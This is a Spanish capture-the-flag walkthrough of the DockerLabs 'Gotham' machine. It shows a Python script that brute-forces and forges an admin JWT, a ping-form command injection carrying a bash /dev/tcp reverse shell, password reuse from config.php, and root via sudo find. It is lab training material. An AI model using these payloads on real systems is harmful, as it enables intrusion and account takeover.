![Screenshot](/easy/Gotham/Images/machine.png)

Dificultad: **Fácil**

Creado por: **TheBat**

---
# Pasos para comprometer la máquina 🥽:
* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---
## 🛠️ Técnicas: Fuerza bruta a JWT (JSON Web Token), Inyección de comandos, Reutilización de credenciales y finalmente escalar privilegios con sudo.

---

En primer lugar, asegurémonos de que la máquina está activa; podemos probarlo con el comando **ping**.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.230 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.138 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.136 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2037ms
rtt min/avg/max/mdev = 0.136/0.168/0.230/0.043 ms
```

Ahora, podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Para iniciar nuestra fase de reconocimiento, usamos **nmap** para conocer qué puertos están abiertos en el objetivo.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 19:42 -0500
Initiating ARP Ping Scan at 19:42
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 19:42, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:42
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 19:42, 2.75s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2026-06-14 19:42:25 -05 for 2s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: CE:BE:22:F4:C0:B6 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, desde el puerto 1 hasta el 65,535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, ya que a veces esto puede ser muy lento durante nuestros escaneos.

**-sS** <- Con este argumento nmap realizará un escaneo sigiloso (stealth), lo que significa que el handshake de tres vías no se completará, haciendo el escaneo ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, acelerando aún más el escaneo.

**-Pn** <- Con este argumento nmap omitirá también la fase de descubrimiento de hosts, tratando a la máquina como activa y realizando el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa; si encuentra un puerto abierto, nos lo reportará al instante.

**--open** <- Con este argumento le decimos a nmap que solo filtre los puertos abiertos.

Una vez que concluye el escaneo, podemos ver 2 puertos abiertos:

- puerto 22 (ssh / Secure Shell)
- puerto 80 (http / Hyper Text Transfer Protocol)

Para saber más sobre estos puertos, como qué servicios y versiones se están ejecutando, podemos usar nmap nuevamente.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ nmap -p22,80 -n -Pn -sCV 172.17.0.2 -oX target.xml
```

**-p22,80** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará la versión de cada puerto para encontrar posibles vulnerabilidades por sistemas sin actualizar, y también ejecutará scripts adicionales para obtener más información sobre estos puertos.

**-oX target.xml** <- Con este argumento guardamos toda la salida de nmap en un archivo XML.

Luego podemos ejecutar **xsltproc** para convertir el archivo XML a HTML, ejecutando el siguiente comando:

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ xsltproc target.xml -o target.html && rm target.xml
```

Después de hacer esto, podemos abrir nuestro navegador para ver el archivo HTML.

Podemos ver la siguiente imagen:

![Screenshot](/easy/Gotham/Images/Image1.png)

Vemos que existe un sitio web y 2 rutas en `robots.txt`: **/dashboard.php** y **/admin.php**.

Usemos **whatweb** para conocer qué tecnologías utiliza este sitio web.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Gotham City Network]
```

Solo podemos ver que utiliza Apache y nada más, así que echemos un vistazo al sitio web.

![Screenshot](/easy/Gotham/Images/Image2.png)

Vemos una página de inicio de sesión; si miramos el código fuente, podemos ver esto:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gotham City Network</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="box">
        <h1>GOTHAM//NET</h1>
        <div class="sub">SECURE ACCESS TERMINAL</div>
        <form method="POST">
            <label>USERNAME</label>
            <input type="text" name="username" autocomplete="off">
            <label>PASSWORD</label>
            <input type="password" name="password">
            <button type="submit">AUTHENTICATE</button>
        </form>
            </div>
    <!-- TODO: remove the temporary guest:guest account before go-live -- W.E. -->
</body>
</html>
```

Vemos un comentario en el sitio web que parecen ser credenciales para iniciar sesión, así que usemoslas.

![Screenshot](/easy/Gotham/Images/Image3.png)

Como podemos ver, iniciamos sesión correctamente, pero si intentamos visitar el panel de administración, no podemos ver nada.

Después de intentar inyecciones SQL o cualquier payload posible, nuestra última opción es probar con el token JWT.

Este es nuestro token JWT:

```ruby
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4NzgyNH0.F8hh4bMFGB36ZmhGB9L4Xq6s64I9g629O4xgogD_49k
```

Podemos intentar decodificarlo con jwt.io y ver esto:

![Screenshot](/easy/Gotham/Images/Image4.png)

Vemos que con este token iniciamos sesión como el usuario `guest` y el rol como `user`. Podemos intentar establecer el algoritmo en `none` y pegarlo en la sesión de nuestro navegador; en raros casos, esto nos permitiría iniciar sesión como administrador, pero si lo probamos, no funciona.

---
# Explotación

Lo último que queda por hacer es obtener la clave secreta mediante fuerza bruta, intentarlo una y otra vez. Si conseguimos la clave secreta, podemos crear otro JWT para iniciar sesión como **admin**.

Ahora, voy a crear un script en Python para intentar obtener la clave secreta y, si la conseguimos, obtener otro JWT como administrador.

```python
from pwn import *
import jwt, signal, warnings

def stop(sig=False, frame=False):
    print()
    warn('QUITTING...')
    exit()

warnings.filterwarnings("ignore")
signal.signal(signal.SIGINT, stop)

rockyou = '/usr/share/wordlists/rockyou.txt'

def generate(key):
    parameters = { 
        "user": "admin",
        "role": "admin",
        "iat": 1781487824
    }

    generated = jwt.encode(parameters, key, algorithm='HS256')
    return generated

def bruteforce():
    bar = log.progress('Bruteforcing')
    token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4NzgyNH0.F8hh4bMFGB36ZmhGB9L4Xq6s64I9g629O4xgogD_49k'

    with open(rockyou, 'r') as file:
        for line in file:
            bar.status(f'Trying with: {line.strip()}')
            try:
                decoded = jwt.decode(token, line.strip(), algorithms=['HS256'])
                info(f'Decoded token: {decoded}')
                bar.success(f'The secret key is: {line.strip()}')
                print()

                info('Creating admin JWT token...')
                generated = generate(line.strip())
                warn(f'The generated admin token is: {generated}')
                stop()
            except Exception: continue

if __name__ == '__main__':
    bruteforce()
```

Si ejecutamos nuestro exploit, podemos ver esto:

```python
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/exploits]
└─$ python exploit.py 
[+] Bruteforcing: The secret key is: batman
[*] Decoded token: {'user': 'guest', 'role': 'user', 'iat': 1781487824}

[*] Creating admin JWT token...
[!] The generated admin token is: [REDACTED]

[!] QUITTING...
```

Vemos que la clave secreta es **batman** y también obtenemos el token JWT de administrador, así que peguemoslo en nuestro navegador cambiando nuestra cookie de sesión por este nuevo token JWT.

Ahora tenemos poderes de administrador y podemos ver esto en nuestro panel de administración:

![Screenshot](/easy/Gotham/Images/Image5.png)

Podemos escribir una dirección IP y recibir la salida, pero esta salida nos resulta familiar, como el comando **ping** en Linux; el comando que hace exactamente esto es el siguiente:

```r
ping -c 1 <INPUT>
```

Ahora podemos intentar una inyección de comandos, algo como esto: ¿qué pasa?

```r
ping -c 1 <INPUT>; id
```

Al ejecutar esto, obtenemos la salida de ping y luego inmediatamente ejecutamos el comando `id`, que devuelve nuestro ID de usuario, ID de grupo, etc.

Probémoslo con esto:

![Screenshot](/easy/Gotham/Images/Image6.png)

Hemos inyectado un comando con éxito; ahora creemos una reverse shell.

Pero antes de ejecutar ese comando, necesitamos estar en modo escucha con **netcat** para recibir la conexión de la reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l** <- Este argumento pone a netcat en modo escucha (listening).

**-v** <- Este argumento activa el modo **verbose**, mostrando con más detalle la conexión que recibimos.

**-n** -> Esto hace que netcat omita la búsqueda DNS y use directamente la dirección IP.

**-p** <- El puerto en el que estamos escuchando; puede ser cualquier puerto que no esté siendo usado actualmente.

Ahora ejecutemos nuestra inyección de comandos:

```r
ping -c 1 <INPUT>; bash -c 'bash -i >& /dev/tcp/172.17.0.1/1234 0>&1'
```

**-c** <- Le decimos a bash que ejecute el siguiente comando.

**-i** <- Le decimos a bash que cree una shell interactiva.

`>&` <- Redirigimos **stderr** a **stdout**.

**0>&1** <- Redirigimos stdin a stdout.

Y recibimos esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43562
bash: cannot set terminal process group (34): Inappropriate ioctl for device
bash: no job control in this shell
www-data@03f902188a92:/var/www/html$ whoami
whoami
www-data
```

¡Ya estamos dentro!

Ahora hagamos un tratamiento de esta terminal fea.

Primero hacemos esto:

```r
www-data@03f902188a92:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Este comando crea una nueva sesión bash con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un log, pero con la ruta /dev/null, hacemos que ese log no pueda registrar comandos, y **-c bash** hace que script ejecute la shell con bash.

Lo hacemos porque queremos usar CTRL + C y más funciones de bash.

Cuando ejecutamos esto, suspendemos nuestra reverse shell por un momento con CTRL + Z.

Luego ejecutamos el siguiente comando en nuestra máquina de ataque:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/exploits]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal de cierta manera.

**raw** <- Con raw hacemos que todos los datos de entrada y salida sean en bruto (raw).

**-echo** <- Con esto hacemos que si ejecutamos un comando, no se vuelva a imprimir en la salida.

**; fg** <- Y con esto reanudamos nuestra reverse shell de nuevo.

Cuando ejecutamos este comando, reiniciamos la xterm:

```r
reset xterm
```

Esto va a reiniciar la terminal.

Si queremos limpiar nuestra terminal no podemos porque el término será diferente al de la xterm, que tiene esta función. Podemos hacer esto de la siguiente manera para poder limpiar nuestra pantalla si se vuelve desagradable, y también obtener colores bonitos en la terminal:

```r
www-data@03f902188a92:/var/www/html$ export TERM=xterm-256color
```

Para activar los colores necesitamos ejecutar el siguiente comando:

```r
www-data@03f902188a92:/var/www/html$ source /etc/skel/.bashrc
```

Y una última cosa, ¡si notamos que la visualización de la terminal es muy pequeña!

Podemos ajustarla para que sea más grande con el siguiente comando:

```r
www-data@03f902188a92:/var/www/html$ stty rows {num} columns {num}
```

¡Y finalmente se ve mucho mejor!

---
# Escalada de privilegios

En el directorio actual en el que estamos, si listamos lo que hay dentro del directorio con **ls**, podemos ver esto:

```r
www-data@03f902188a92:/var/www/html$ ls
admin.php  config.php  dashboard.php  index.php  jwt.php  robots.txt  style.css
```

Vemos un archivo interesante **config.php**; si vemos su contenido, podemos ver esto:

```r
www-data@03f902188a92:/var/www/html$ cat config.php 
<?php
// config.php — Gotham City Network (internal)
// =============================================
// Legacy DB connection. Migrar a vault pendiente.
$DB_HOST = '127.0.0.1';
$DB_USER = 'gothamdb';
$DB_PASS = '[REDACTED]';   // NOTE(W.E.): misma clave usada en la cuenta de mantenimiento

// Secreto de firma de sesiones (rotar trimestralmente)
$JWT_SECRET = 'batman';

// Cuentas de la aplicación
$USERS = [
    'guest' => ['pass' => 'guest', 'role' => 'user'],
];
?
```

Vemos un usuario y también su contraseña; podemos intentar usar esta contraseña para el único usuario del sistema (bruce).

```r
www-data@03f902188a92:/var/www/html$ su bruce
Password: 
bruce@03f902188a92:/var/www/html$ whoami
bruce
```

Ahora somos el usuario bruce; intentemos ver si tenemos algunos privilegios de sudoer con **sudo -l**.

```r
bruce@03f902188a92:/var/www/html$ sudo -l
Matching Defaults entries for bruce on 03f902188a92:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User bruce may run the following commands on 03f902188a92:
    (root) NOPASSWD: /usr/bin/find
```

Y podemos ver que podemos ejecutar el comando `find`, como el usuario **root**.

Así que ejecutemos el siguiente comando para obtener una shell como el usuario root:

```r
bruce@03f902188a92:/var/www/html$ sudo find . -exec bash \; -quit
```

Ejecutamos un comando bash para obtener una shell como el usuario root.

```c
bruce@03f902188a92:/var/www/html$ sudo find . -exec bash \; -quit
root@03f902188a92:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@03f902188a92:/var/www/html# cat /root/root.txt 
a7e2c9f81b6d40539e8170264fbac3d5
```

¡Genial, ahora somos root ***...pwned..!***
